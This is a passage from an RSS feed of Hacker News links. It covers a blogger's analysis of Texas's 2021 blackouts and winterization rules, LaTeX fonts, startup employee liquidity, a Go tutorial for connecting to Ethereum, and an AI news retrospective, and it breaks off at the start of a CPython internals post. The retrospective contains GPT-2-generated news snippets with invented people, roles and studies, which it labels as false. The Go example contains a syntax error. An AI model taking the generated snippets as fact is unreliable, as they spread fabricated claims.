        <p>Let me preface this with an explanation. Over the last few days I read online people saying that Texas' power outages had been caused by Texas being on its own grid‚Ä¶ deregulation‚Ä¶ Not following national standards‚Ä¶  had Texas been connected to the Eastern Interconnection or the Western Interconnection none of this would have happened. But not one post shows any evidence or requirements that backed up these claims. So, I went looking for proof and instead of finding requirements, I found a nationwide problem with winterization. As an aside I am not an expert in the grid or electricity, I am a software developer, and this is my best interpretation of the requirements I could find.</p>
<p>Let‚Äôs start off with how the electrical grid works in the US. The grid is made up of 3 interconnections: the Eastern Interconnection, the Western Interconnection, and the Texas Interconnect. Each of these interconnections operate in (near) isolation with their own frequency, voltage, and phase. There are several high voltage DC interconnects (HVDC or DC-DC) between them. In each of these interconnections there is at least one grid operators, for example ERCOT in Texas. These grid operators manage the generation and load of their interconnection, acting as almost as an electric clearing house. They are also responsible for keeping voltage and frequency within range and directing distributors (like ONCOR in north Texas) to shed load during Electrical Emergency Alerts (EEA). An important thing to note for later, from the best I can tell the different grid operators in the Eastern Interconnect share power in a ‚Äúnon-firm, as-available basis‚Äù.</p>
<p>What happened in Texas, starting 12:30 AM February 15. The long and short of it is an estimated 34GW of generation went offline in about 2 hours[1]. Looking at ERCOT‚Äôs tweets [2,3,4], generation was starting to have an issue at 00:17:45 and some load needed to be shed so ERCOT issued the first EEA (EEA1). In the February EEA tools document[5] EEA1 can open up around 1.6GW of ‚Äúpeeker‚Äù generation and importation from the Eastern and Western Interconnections. But by 1:12:06 that wasn‚Äôt enough and additional load had to be shed.  A second EEA was issued (EEA2) shedding another 1.6GW. But just a few minutes later the house came crashing down and at 1:25:40 the third EEA (EEA3) was issued. In addition to starting rolling blackouts to shed most of the load it also allowed for other actions to free .1-.2GW of load.</p>
<p>The 34GW of generation lost was from every fuel source used. Most of it was frozen-off natural gas (gas) wells, some of it was frozen wind turbines, solar panels that had snow on them and even a nuclear plant had to go offline due to issues with feedwater pressure sensing issues related to the cold.
What do the North American Electric Reliability Corporation (NERC) standards say about protecting any of these sources? Not much.</p>
<p>Let‚Äôs start by looking at the least complex, wind turbines. On September 12, 2012 NERC published a Lesson Learned document in regards to Texas‚Äôs issues with some of the wind farms freezing in extreme winter weather[6]. According to the document the event that was predicted over a week beforehand brought 4 days of low temperature, high winds and wind chills, ice and snow that limited the generation facility to just 25% of capacity. The facility did have a SOP for icing conditions that was implemented. However, the facility never defined it‚Äôs minimum operating temperature. When lightning knocked out some of the sensing equipment, the turbines had to be stop for safety. The repair crews couldn‚Äôt immediately get to the turbines and they had to sit, this gave the oil a chance to cool and partly freeze. When the turbines were returned to service, they tripped back off due to high oil pressure. Eventually after working with the manufacturer they were able to safely heat the oil and restart the turbines. One of the big lessons from this was to install cold weather packs for wind turbines and watch the oil temperature. You‚Äôd think that would solve future outage, but no, in 2019 in the midwestwind turbines failed due to exceptionally low temperatures, around -21. Again the cold weather package hadn‚Äôt been installed and was one of the root causes of the failure[7].</p>
<p>The nuclear plant‚Äôs sensing problems had happened before too. Although it wasn‚Äôt a nuclear plant, there are several documented cases on NERC‚Äôs website citing cold weather and sensor issues [8,9]. This repeated in Texas (2011) and in the south east (2018)[10].</p>
<p>Let‚Äôs discuss natural gas next. It appears that most of the issues in the problematic natural gas fired facilities was due to low gas supplies. In 2012 NERC warned of the interconnectivity of natural gas and electric[11]. Natural gas coming out of the ground has a naturally high water content. This water can freeze the extraction equipment during sub-freezing weather in improperly winterized wells creating what is know as a freeze-off. businesses, residential customers, and powerplants all run off the same supply, once wells start freezing off the supply dwindles for all. Natural gas companies prioritize residential customers as needed and will cut businesses and powerplants. This obviously creates issues in electrical generation.</p>
<p>In this latest case, much of the gas generation loss was due to under pressure conditions at the generation site. When generation sites detect this kind of fault, they are taken offline for safety. Not only is this what happened this year, but it has happened many, many times before</p>
<p>The most resent case I could find was 2018 in the south east[10]. Starting on January 18, 2018 a large area in the south east US experienced unusually cold weather. This caused 183 generation facilities to go offline or operate with greatly reduced output. At the peak there was nearly 30GW of production lost. This caused several grid operators to issue EEAs and begin rolling blackouts. In the ‚Äúevent area‚Äù 14% of the failures could be directly attributed to the cold weather. And another 30% could be indirectly linked to weather, including mechanical failures know to happen in cold weather and gas supply issues. NERC found that more than 33% of the failed powerplants didn‚Äôt have a winterization plan.</p>
<p>Why didn‚Äôt these plants have a winterization plan? Because it wasn‚Äôt required[10,12].</p>
<p>This wouldn‚Äôt be so bad if this wqs the first time it happened, it wasn‚Äôt even the second time it happened. In 2014 a polar vortex hit the US. bringing temperatures well below normal. During this event 55% of the outages were at gas power plants and in all 90GW of generation was lost[13].</p>
<p>The earliest report I could find was from the 2011 winter event in Texas[14]. A very strong cold front hit Texas (and other parts of the south central US) bringing temperatures below freezing for over 4 days and winds over 30 MPH. Leading up to the event, ERCOT and other grid operators in surrounding areas felt that there wouldn‚Äôt be a need for rolling blackouts. At the beginning of the event ERCOT had 3.1GW of reserve, nearly 1GW over the minimum required. However, over the next 2 days ERCOT lost nearly 30GW of production in 193 generation facilities. ERCOT was able to stabilize the grid with rolling blackouts and the other EEA methods[5]. Other grids suffered problems as well, EPE (El Paso) and SRP (Arizona) lost nearly 1.4GW due to cold weather. Another issue in ERCOT‚Äôs region was nearly 50% of the ‚Äúblack start‚Äù facilities were either down for scheduled maintenance or failed on startup. One of the main causes again was the loss of gas during this blackout period. 14.8 Bcf of natural gas production was lost due to freeze-offs, electrical outages (ironically) and customer curtailments. following the previous equivalent storm in 1989, the PUCT (Public Utility Commission of Texas) issued several recommendations and guidelines for winterization of power plants and gas wells. However, due to the infrequency of these storms the implementation lacked. With many of the same facilities that failed in 1989 also failed in 2011.  My guess is these same sites failed again in 2021. Interestingly the NERC found that it is quite possible that gas production in these unusually cold conditions may be impossible.</p>
<p>What has been done since 2011? Not a whole lot. A request for a new standard was issued to NERC in late 2012, however a few months later it was denied.[15] Also in 2012 NERC put out a set of guidelines for developing a plan for winter weather[16]. In 2017 NERC put out a special reliability report on the relationship between gas and electricity[17]. Finally, after the 2018 event NERC received another standard request that was approved[23], however it won‚Äôt be finalized until late 2021[18,19,20].</p>
<p>From what I can see, ERCOT has more restrictive rules in their Generator Winter Weatherization Workshop than NERC[21]. All generation stations must have plans for emergencies, address abnormal weather, critical failure points, weather design limits, alternative fuels and testing[21,22]. ERCOT reports that there were 80 spot checks done in the 2019/2020 season with 71 being gas plants and 6 being black start gas plants. 23 had to improve and would be reinspected in early 2021 the rest passed.</p>
<p>The issue of extreme cold weather and electrical outages is a national issue that needs to be addressed. However, after repeated failings it hasn‚Äôt really been addressed. Hopefully with the new NERC requirements and the Texas legislature in session progress can be made.</p>
<hr>
<p>[1] <a href="http://www.ercot.com/news/releases/show/225244">http://www.ercot.com/news/releases/show/225244</a><br>
[2] <a href="https://twitter.com/ERCOT_ISO/status/1361197991659503618">https://twitter.com/ERCOT_ISO/status/1361197991659503618</a><br>
[3] <a href="https://twitter.com/ERCOT_ISO/status/1361211669788176384">https://twitter.com/ERCOT_ISO/status/1361211669788176384</a><br>
[4] <a href="https://twitter.com/ERCOT_ISO/status/1361215084010352644">https://twitter.com/ERCOT_ISO/status/1361215084010352644</a><br>
[5] <a href="http://www.ercot.com/content/wcm/lists/219692/EEA_Tools_One_Pager_Winter_2021_2-13-2021.pdf">http://www.ercot.com/content/wcm/lists/219692/EEA_Tools_One_Pager_Winter_2021_2-13-2021.pdf</a><br>
[6] <a href="https://www.nerc.com/pa/rrm/ea/Lessons%20Learned%20Document%20Library/LL20120901_Wind_Farm_Winter_Storm_Issues.pdf">https://www.nerc.com/pa/rrm/ea/Lessons%20Learned%20Document%20Library/LL20120901_Wind_Farm_Winter_Storm_Issues.pdf</a><br>
[7] <a href="https://www.nerc.com/pa/rrm/ea/Lessons%20Learned%20Document%20Library/LL20200601_Unanticipated_Wind_Generation_Cutoffs_during_a_Cold_Weather_Event.pdf">https://w‚Ä¶</a></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://garrettbattaglia.com/post/texas-power/">https://garrettbattaglia.com/post/texas-power/</a></em></p>]]>
            </description>
            <link>https://garrettbattaglia.com/post/texas-power/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26186645</guid>
            <pubDate>Thu, 18 Feb 2021 22:26:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Latex Fonts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26186538">thread link</a>) | @alderz
<br/>
February 18, 2021 | https://r2src.github.io/top10fonts/ | <a href="https://web.archive.org/web/*/https://r2src.github.io/top10fonts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2>assembled by Jaap Joris Vens</h2>

<p>

This page contains ten paragraphs typeset by the
<a href="http://www.latex-project.org/"><span>L<sup>a</sup>T<sub>e</sub>X</span>
typesetting system</a>, converted to images by
the <a href="http://savannah.nongnu.org/projects/dvipng/">dvipng</a>
utility.  Each paragraph<sup>1</sup> showcases a different font family
and provides some background and usage instructions.

The source of this page is <a href="https://github.com/r2src/top10fonts/">available on GitHub</a>.

All the fonts are free and open source and are included by default in
most <span>L<sup>a</sup>T<sub>e</sub>X</span>
distributions.  All fonts are also available
on <a href="http://www.ctan.org/tex-archive/fonts/">CTAN</a>, as well as in the
<a href="http://www.tug.dk/FontCatalogue/"><span>T<sub>e</sub>X</span>
Font Catalogue</a>.<br>
<span>
&nbsp;&nbsp;&nbsp;<sup>1</sup> except for this one, which is the only
paragraph rendered by your browser.
</span>
</p>

<p>
<img src="https://r2src.github.io/top10fonts/lmodern.png" alt="1 Computer Modern">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/kpfonts.png" alt="2 Kepler Fonts">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/fontcomp.png" alt="Comparison table">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/kpsans.png" alt="Kepler Sans">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/didot.png" alt="6 GFS Didot">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/utopia.png" alt="4 Utopia">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/venturis.png" alt="5 Venturis ADF">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/venturisrm1.png" alt="">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/venturisrm2.png" alt="">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/venturisrm3.png" alt="">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/libertine.png" alt="6 Libertine">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/gyre.png" alt="7 TeX Gyre Collection">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/gyrebonum.png" alt="Bonum">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/gyrepagella.png" alt="Pagella">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/gyreschola.png" alt="Schola">
</p>
<p>
<img src="https://r2src.github.io/top10fonts/gyretermes.png" alt="Termes">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/antiqua.png" alt="7 URW Antiqua">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/bera.png" alt="10 Bitstream Vera">
</p>

<p>
<img src="https://r2src.github.io/top10fonts/boisik.png" alt="8 Boisik">
</p>



</div>]]>
            </description>
            <link>https://r2src.github.io/top10fonts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26186538</guid>
            <pubDate>Thu, 18 Feb 2021 22:19:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Which startups let their employees sell stock?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26186119">thread link</a>) | @gk1
<br/>
February 18, 2021 | https://sacra.com/startup-employee-liquidity/ | <a href="https://web.archive.org/web/*/https://sacra.com/startup-employee-liquidity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article class="page">
      <section>
        <div>
          

          <div>
            <p>Selling stock is a taboo subject at a lot of startups.</p>

            <p>To normalize talking about liquidity and help employees make informed career decisions, we built this list of companies that do and don‚Äôt allow employees to sell their stock.</p>

            <p><strong>Want to help?</strong> <a href="https://airtable.com/shrbQ6hB22DzXsHOR">Fill out out our survey</a>.</p>
          </div>
        </div>
      </section>
      <section>
        <div>
          

          <div>
            <div>
              <h3>Do you work at a VC-backed company?</h3>

              <p>Help us add to this database anonymously. Your responses will be kept confidential.</p>

              <p><a href="https://airtable.com/shrbQ6hB22DzXsHOR">Add a report</a>
            </p></div>
            <div>
              <h3>Are you an employer?</h3>

              <p>Tell us about your company‚Äôs policies around secondary sales and employee liquidity. We‚Äôd love to hear from you.</p>

              <p><a href="https://airtable.com/shr8aZVC34siGSxAx">Respond to this report</a>
            </p></div>
          </div>
        </div>
      </section>

      <section>
        <div>
          <h2>Liquidity programs by stage</h2>
          
          <div>
            <p>Later-stage companies are more likely to allow employee stock sales, either through company-led transactions or by allowing employee-led transactions. Doing so allows them to provide long-time members of the team with an opportunity to de-risk by getting some liquidity. 

            </p><p>However, today, some companies like Pipe have begun making liquidity available for their employees as early as seed/Series A.</p>

            <p>Some companies don‚Äôt allow for employee sales of their stock. In some instances, these companies implement transfer restrictions that prevent private sales from occurring.</p>

          </div>
        </div>
      </section>
      <section>
        <div>
          <h2>Resources for employees</h2>



          <h3>Stock option exercise lending</h3> 
          
          <p>One barrier to employee liquidity is exercising your stock options, which can be expensive and confusing. Some companies help by allowing employees to borrow cash to meet their option exercise and tax obligations. </p>

          <h3>Secondary brokerages</h3>
          
          <p>If your company allows for you to sell your stock, but doesn‚Äôt offer regular company-led liquidity, you may be able to sell it on a secondary marketplace or via a broker.</p>
          <h3>Secondary funds</h3>
          
          <p>Certain venture funds specialize in ‚Äúspecial situations‚Äù like employee and/or founder liquidity at private companies, and actually prefer to buy stock in secondary markets.</p>
          <h3>Company liquidity platforms</h3>
          
          <p>If your company offers regular liquidity by way of tender offers, share buybacks, or auctions, you will likely know about it well in advance. If you‚Äôre not sure, you can ask your HR or finance team and they will let you know if your company allows for these types of transactions.</p>

          <h4>Learn more</h4>

          
        </div>
      </section>
    </article>
  </div></div>]]>
            </description>
            <link>https://sacra.com/startup-employee-liquidity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26186119</guid>
            <pubDate>Thu, 18 Feb 2021 21:46:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to connect to Ethereum network using Go]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26186024">thread link</a>) | @Sahil_Sen
<br/>
February 18, 2021 | https://www.quiknode.io/guides/web3-sdks/how-to-connect-to-ethereum-network-using-go | <a href="https://web.archive.org/web/*/https://www.quiknode.io/guides/web3-sdks/how-to-connect-to-ethereum-network-using-go">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span>
        <div><p>The following will show you how to initialize your Go project, connect to the Ethereum network and get the latest block number, quickly, easily, and headache-free, provided you have installed the latest version of Go on your environment.&nbsp;</p><p>1. Create a file called quiknode.go&nbsp;</p></div><pre><code>package main

import (
	"fmt"
	"log"

	"github.com/ethereum/go-ethereum/ethclient"
)

func main() {

	client, err := ethclient.Dial("<strong>ADD_YOUR_ETHEREUM_NODE_URL</strong>")

	if err != nil {
		log.Fatalf("Oops! There was a problem", err)
	} else {
		fmt.Println("Success! you are connected to the Ethereum Network")
	}
}
<br></code></pre><p>Replace `<strong>ADD_YOUR_ETHEREUM_NODE_URL</strong>` with the provider endpoint you saved earlier.</p><div><p>2. Create a module to track dependencies. If you√¢‚Ç¨‚Ñ¢re not familiar with go, this is an essential step in setting up your project√¢‚Ç¨‚Ñ¢s dependencies. With Go it√¢‚Ç¨‚Ñ¢s quite easy</p></div><pre><code>go mod init quiknode</code></pre><p>This will ensure the ethclient that was included in your code is downloaded from GitHub and installed locally. It happens automatically and the latest version should be pulled into your environment along with built-in Go modules.&nbsp;</p><pre><code>Go run quiknode.go</code></pre><div><p>If everything goes well, you will see the following message:</p><figure data-trix-attachment="{&quot;content&quot;:&quot;<span class='trix-attachment-spina-image' data-label=''> <img class='w-full' src='https://www.quiknode.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBWdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--4a207b2262042d5a1236f6ebc0cd4ee79d0afaad/main.go.png' alt='' /> </span>&quot;}" data-trix-content-type="undefined"><span data-label=""> <img src="https://www.quiknode.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBWdz09IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--4a207b2262042d5a1236f6ebc0cd4ee79d0afaad/main.go.png" alt=""> </span><figcaption></figcaption></figure></div><div><p>That was easy! You are now running your own node that is connected and synced. Next, check if your node is working and pull some information from the blockchain.</p></div><p>4. Modify your code to obtain additional information from the ETH blockchain:</p><pre><code>package main

import (
    "context"
    "fmt"
    "log"

    "github.com/ethereum/go-ethereum/ethclient"
)

func main() {
    client, err := ethclient.Dial("ADD_YOUR_ETHEREUM_NODE_URL")
   
    if err != nil {
		log.Fatalf("Oops! There was a problem", err)
    } 
    else {
		fmt.Println("Sucess! you are connected to the Ethereum Network")
	}
	header, err := client.HeaderByNumber(context.Background(), nil)
	if err != nil{
		log.Fatal(err)
	} 
	else {
		fmt.Println(header.Number.String())
	}
}</code></pre><p>&nbsp;A quick explanation of the code above:</p><p>Lines 1-9: Declaring the main package and adding dependencies necessary to connect to the blockchain.<br>Line 11: Invoking the main function.</p><p>Line 12: Setting up our client and connecting it to an Ethereum node hosted by QuikNode.</p><p>Line 14: Checking for connection errors.<br>Line 18: Displaying a message on the successful connection.<br>Line 20: Sending a request to our node to obtain the latest block number.<br>Lines 21-26: Checking for request error and outputting a success message if no errors, converting the hash number to a string and displaying it.</p><p>Don√¢‚Ç¨‚Ñ¢t forget to replace `<strong>ADD_YOUR_ETHEREUM_NODE_URL</strong>` with the http endpoint address for your own node.&nbsp;</p><p>Upon successful execution, you will see a similar message:</p><div><br><figure data-trix-attachment="{&quot;content&quot;:&quot;<span class='trix-attachment-spina-image' data-label=''> <img class='w-full' src='https://www.quiknode.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBWjA9IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--97d5ab1060be2f31abcb7f37e157d0d482ab5316/Screenshot%20(63).png' alt='' /> </span>&quot;}" data-trix-content-type="undefined"><span data-label=""> <img src="https://www.quiknode.io/rails/active_storage/blobs/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBWjA9IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--97d5ab1060be2f31abcb7f37e157d0d482ab5316/Screenshot%20(63).png" alt=""> </span><figcaption></figcaption></figure></div><p>That√¢‚Ç¨‚Ñ¢s it! You can now use your own QuikNode and build the next awesome dApp using Go.</p>
      </span>
    </p></div>]]>
            </description>
            <link>https://www.quiknode.io/guides/web3-sdks/how-to-connect-to-ethereum-network-using-go</link>
            <guid isPermaLink="false">hacker-news-small-sites-26186024</guid>
            <pubDate>Thu, 18 Feb 2021 21:39:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analysis of 100 Weeks of Curated AI News]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26185936">thread link</a>) | @andreyk
<br/>
February 18, 2021 | https://www.skynettoday.com/digests/ai-news-analysis | <a href="https://web.archive.org/web/*/https://www.skynettoday.com/digests/ai-news-analysis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>        
      
      
      <h4>A look at trends from 100 weeks of AI news, and AI-generated AI news snippets!</h4>
      
      </div><div>
      <p>With this week‚Äôs ‚ÄúLast Week in AI,‚Äù Skynet Today has just released its 100th edition of <a href="https://lastweekin.ai/">our weekly newsletter summarizing each week‚Äôs major AI news</a>! 
That‚Äôs almost 2 years of covering the developments in AI, sifting through the often noisy AI news landscape for important trends, while highlighting potential hypes and concerns.</p>

<p>To commemorate this occasion, we‚Äôre publishing a few notable statistics on these past 100 weeks.
And, for fun, we‚Äôve fine-tuned a GPT-2 model on all the AI news articles we‚Äôve covered so far to generate a few AI news snippets.</p>

<h2 id="weekly-ai-news-trends-across-100-weeks">Weekly AI News Trends across 100 weeks</h2>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/100_analysis/article_count.png" alt="Article Count">
  <figcaption>
    The number of articles per newsletter increased after mid-2019 when we adopted a more automated pipeline for collecting and filtering AI news articles.
  </figcaption>
</figure>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/100_analysis/keyword_trends_cumulative_ai_topics.png" alt="AI Topics">
  <figcaption>
    It seems like at least for the articles we collect, ones related to "robots" grew much faster than other areas.
    Note: keyword trends also count related terms - for example, "hardware" also counts mentions of "GPU"
  </figcaption>
</figure>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/100_analysis/keyword_trends_cumulative_news_topics.png" alt="AI News Topics">
  <figcaption>
    After late 2019, articles regarding facial recognition grew much faster than others, with Covid-19 articles making a sudden entrance starting early 2020.
    Articles regarding Deep Fakes also saw a sudden jump starting mid-2019.
  </figcaption>
</figure>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/100_analysis/keyword_trends_cumulative_institutions.png" alt="AI Institution Topics">
  <figcaption>
    Perhaps unsurprisingly, Google dominates the AI news cycle in terms of mentions of institution names.
    In distant seconds are the other tech giants of Amazon, Facebook, and Microsoft.
  </figcaption>
</figure>

<figure>
 <img src="https://www.skynettoday.com/assets/img/digests/100_analysis/sentiment_by_topic.png" alt="Sentiment">
  <figcaption>
    Sentiment analysis of article summaries across various topics has some expected but neat results; some AI applications, such as art, have mostly positive coverage, while others such as surveillance have generally negative coverage.
  </figcaption>
</figure>

<h2 id="ai-generated-ai-news-articles">AI-Generated AI News Articles</h2>

<p>We finetuned a GPT-2 model on the AI articles we linked throughout our newsletters to generate the follow AI news snippets.
While they‚Äôre written in the style of AI news, mentioning the appropriate keywords and phrases, they‚Äôre generally logically inconsistent and contain obvious factual errors.
For example, the first snippet mentions a researcher by the name of Atushi Sakamoto.
While this name does belong to a real researcher, in real life he is a Professor of Integrated Life Sciences at Hiroshima University, not someone studying AI at the University of Tokyo.
This is unsurprising given how these models work (see <a href="https://www.skynettoday.com/briefs/gpt2">here</a>, <a href="https://www.skynettoday.com/editorials/humans-not-concentrating">here</a>, and <a href="https://www.skynettoday.com/briefs/gpt3">here</a>).</p>

<p>But, reading these generated snippets can still be an interesting experience - some are as bad as others are hilarious:</p>

<!-- Quote Slideshow code from https://www.w3schools.com/howto/howto_js_quotes_slideshow.asp -->

<!-- Dots/bullets/indicators -->


<div>

  <div>
    <h5> Researchers develop a traffic light for self-driving cars </h5> 
    <p><q>
    A pair of new papers from University of Tokyo Institute of Technology researchers and the World Health Organization claim to have addressed one of the great challenges of artificial intelligence: traffic lights. Thanks to machine learning, they can illuminate traffic for much more effective and safer operation than they could on paper. In research authored by Atsushi Sakamoto and colleagues at the Institute of Intelligent Systems and Decision Support in Tokyo, the team presents an efficient way to turn traffic lights on and off. In practice, however, identifying and setting the timing for lighting within a traffic space can prove difficult, as it‚Äôs often unpredictable and there may even be visual clues that indicate the start of a car ahead or the end of a short one. Sakamoto and colleagues came up with an efficiency-enabling solution based on approaches developed by researchers at Google, IBM, and Toyota.
    </q>
  </p></div>

  <div>
    <h5> How I used NLP's GPT-3 to write the AI I Created </h5>
    <p><q>
    When it comes to creating AI, there are 2 main choices I have:- write a clean code or- just use the output from the original app to clean code. Either way, there are a lot of good articles and code examples on arxiv.com.The reason I choose the latter is both lovely and surprising: with a solid foundation of 30 lines of code (more on that later), this way of creating and using AI is fairly simple. I wanted a clean, sharp and concise writing experience that would let my coworkers and I take on difficult creative problems with clear writing. What I didn't expect was for the first part of the code to become a bottleneck, exposing the messiness of the AI. The second reason may be more complex: I was writing this sentence while driving, and as I was about to cross the street, I accidentally sent the car driving by on the bright day and ended up writing another code to keep driving. Despite its simplicity, the problem with GPT-3 is its inability to generate long sequences.
    </q>
  </p></div>

  <div>
    <h5> AI researchers propose making chatbots and voice assistants more like their real-world peers </h5>
    <p><q> 
    Chatbots, which are a form of virtual personas, have long been the interface between human and machine. Advances in the past few years have democratized voice assistants, responding to the needs of multiple speakers at once, aiming to reduce set times and improve duration. But much of the field has proven difficult to apply conversational AI effectively in the real world, especially on sensitive tasks involving such as sales or customer service.To address this issue, a team from MIT Technology Review (MIT Tech Review) and Beijing-based research institute Beijing Brain Institute have developed a novel approach to training conversational AI systems on a dataset of short conversations over long periods of time. The researchers developed a chatbot named QUEBO after their lab name, which stands for QUEBO, "Qu≈ç-" or "QUE-BO." They say the research will serve as a benchmark to benchmark conversational AI‚Äôs capability to handle small conveniences like social media conversations in real time.
    </q>
  </p></div>

  <div>
    <h5> Amazon to Retrain a Third of Its U.S. Workers as Automation Advances </h5>
    <p><q>
    So far, the American workforce has been largely in workers of color. But Amazon is about to ramp up hiring of some of its more 200,000 hourly workers, according to a person familiar with the company‚Äôs plans. The new hires won‚Äôt be those in the same field as its more self-professed ‚Äúwhite-collar workers,‚Äù as the company abbreviates its growing staff. Instead, the roughly 1,000 new workers will be drawn from two large and multiracial groups: Amazon has laid off thousands of Black and Latinx workers, has laid off dozens of Latinx employees, and is currently seeking Federal Employment Development money to pay for new workers. ‚ÄúRight now, the numbers of Black, Latinx, and African American workers are shrinking, because there‚Äôs still not enough talent available to continue these high-volume, high-pressure work,‚Äù the person familiar with Amazon‚Äôs plans explained. Amazon declined to comment on the more than 1,000 new positions it plans to employ.
    </q>
  </p></div>

  <div>
    <h5> Meet Microsoft's first AI-powered coffee machine </h5>
    <p><q>
    Jeff Dean, chair of Microsoft‚Äôs artificial intelligence (AI) division, recently sat down with WIRED senior writer Will Knight to discuss the value of building products that do a lot of good, but don‚Äôt always do much of anything else. Dean tells WIRED that he thinks we‚Äôll all need to find some sort of ‚Äúgeneral purpose product‚Äù ‚Äî a conceptual mashup of software and hardware that completely reimagines the capabilities of a specific computer (or, more generally, a business) in order to tackle one task. It‚Äôll probably require buy-in from product builders, analyst agnostics, human resources departments, call centers, product managers, and a few other well-intentioned minds, but Microsoft has a pretty good shot at that right now. Dean tells WIRED that while there‚Äôs certainly value in building product companies that ‚Äúdo something interesting,‚Äù they also need to do it in a way that can tackle customer needs.
    </q>
  </p></div>

  <p><a onclick="plusSlides(-1)">‚ùÆ</a>
  <a onclick="plusSlides(1)">‚ùØ</a>
</p></div>

<p>See <a href="https://github.com/andreykurenkov/ai-news-analysis/edit/main/gpt2_articles.txt">here</a> for all the raw generated article snippets.</p>

<p>For those who are interested, see <a href="https://github.com/andreykurenkov/ai-news-analysis">here</a> for the code we used to generate the plots above as well as train and run the GPT-2 model. Or, play with the data right away by copying and messing around with this <a href="https://drive.google.com/file/d/1EXWDQvkksuV9Gursd9uE3ul6ZWR08fv3/view?usp=sharing">Colab Notebook</a>.</p>






    </div></div>]]>
            </description>
            <link>https://www.skynettoday.com/digests/ai-news-analysis</link>
            <guid isPermaLink="false">hacker-news-small-sites-26185936</guid>
            <pubDate>Thu, 18 Feb 2021 21:33:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Let's break CPython together, for fun and mischief]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26185831">thread link</a>) | @lochsh
<br/>
February 18, 2021 | https://mcla.ug/blog/cpython-hackage.html | <a href="https://web.archive.org/web/*/https://mcla.ug/blog/cpython-hackage.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
	
	<p><span>Sun 13 October 2019</span></p><p>I promise that nothing we do here will be useful.</p>
<p>But I promise it will be entertaining, and (hopefully) educational:</p>
<ul>
<li>
<p>if you don't know anything about the CPython internals, you're about to
learn (a bit)</p>
</li>
<li>
<p>if you do know about the CPython internals, you're hopefully about to
learn some new ways to abuse them üòâ</p>
</li>
</ul>
<h2>Clarification</h2>
<p>Before we proceed to hackage, let me make sure it's clear what I'm talking
about when I say "CPython internals". CPython is the reference implementation
of Python, and it's what most people use. It's what comes as standard on any
system I've ever used.</p>
<p>A Python implementation includes the interpreter, the built-in types and the
standard library. With CPython, apart from much of the standard library which
is in Python, this is all written in C. There are other implementations:</p>
<ul>
<li>PyPy is written in Python itself and has a JIT compiler, it's really fast</li>
<li>Jython runs on the JVM</li>
<li>IronPython runs on .NET the Microsoft framework</li>
</ul>
<p>Everything we do here is exploiting the specific implementation details
of CPython.</p>
<h3>YMMV</h3>
<p>Please bear in mind that Python was not designed to do the things we're going
to do, and some of the fun things that worked with the version of Python I used
here, my operating system, &amp;c., might end up segfaulting for you. Running stuff
in ipython rather than the standard REPL will also likely end up with more
issues occurring when things are hacked.</p>
<h2>To whet your appetite</h2>
<p>Let's have a look at the Python language reference. The first two sentences of
the <a href="https://docs.python.org/3/reference/datamodel.html">data model</a> say this:</p>
<blockquote>
<p>Objects are Python‚Äôs abstraction for data. All data in a Python program is
represented by objects or by relations between objects.</p>
</blockquote>
<p>In CPython a Python object is defined in the
<a href="https://github.com/python/cpython/blob/10e5c66789a06dc9015a24968e96e77a75725a7a/Include/object.h#L104"><code>PyObject</code></a>
struct:</p>

<div>
<pre id="vimCodeElement"><span id="L1">1 </span><span>typedef</span> <span>struct</span> _object {
<span id="L2">2 </span>    _PyObject_HEAD_EXTRA
<span id="L3">3 </span>    Py_ssize_t ob_refcnt;
